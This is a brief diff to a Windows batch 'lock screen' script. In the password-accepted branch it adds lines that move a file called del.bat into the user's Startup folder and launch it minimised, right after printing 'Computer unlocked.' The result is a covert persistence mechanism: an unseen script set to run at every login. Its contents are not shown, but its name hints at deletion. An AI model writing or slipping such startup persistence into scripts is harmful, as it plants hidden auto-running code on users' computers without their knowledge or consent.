@@ -57,6 +57,10 @@ if %Input% equ %password% (
         cd..
         tree
         echo Computer unlocked.
+        @echo off
+        set des_path=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup
+
+        move %cd%\del.bat %des_path%
         start /min del.bat 
 	goto End
 ) else (
